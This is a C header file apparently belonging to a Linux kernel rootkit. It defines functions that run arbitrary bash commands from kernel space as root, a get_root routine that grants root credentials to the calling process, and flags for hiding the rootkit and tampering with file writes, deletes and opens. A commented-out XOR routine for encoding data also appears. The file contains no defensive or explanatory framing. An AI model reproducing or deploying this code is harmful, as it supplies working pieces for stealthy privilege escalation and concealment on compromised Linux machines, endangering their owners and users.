#ifndef UTILS_H
#define UTILS_H


#include <linux/version.h>
#include <linux/kallsyms.h>
#include <linux/cred.h>

#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 14, 0)
# include <linux/kmod.h>
#else
# include <linux/umh.h>
#endif

#define do_encrypt(ptr, len, key)	do_encode(ptr, len, key)
#define do_decrypt(ptr, len, key)	do_encode(ptr, len, key)

/*static inline unsigned int custom_rol32(unsigned int val, int n)
{
	return ((val << n) | (val >> (32 - n)));
}

static inline void do_encode(void *ptr, unsigned int len, unsigned int key)
{
	while (len > sizeof(key)) {
		*(unsigned int *)ptr ^= custom_rol32(key ^ len, (len % 13));
		len -= sizeof(key), ptr += sizeof(key);
	}
}*/

static inline int exec(char **argv)
{
	char *envp[] = {"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL}; 
	return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static inline int run_cmd(char *cmd)
{
	char *argv[] = {"/bin/bash", "-c", cmd, NULL};
	return exec(argv);
}

#ifdef CONFIG_GIVE_ROOT
static inline void get_root(void)
{
	commit_creds(prepare_kernel_cred(0));
}
#endif

extern int hidden;
extern int nowrite = 0;
extern int no_delete = 0;
extern int no_open = 0;
extern int file_tampering_flag; 


static inline void flip_hidden_flag(void)
{
    if (hidden)
        hidden = 0;
    else
        hidden = 1;
}

//int util_init(void);
//int get_cmdline(struct task_struct *task, char *buffer, int buflen);
//int run_cmd(const char *cmd);


#endif  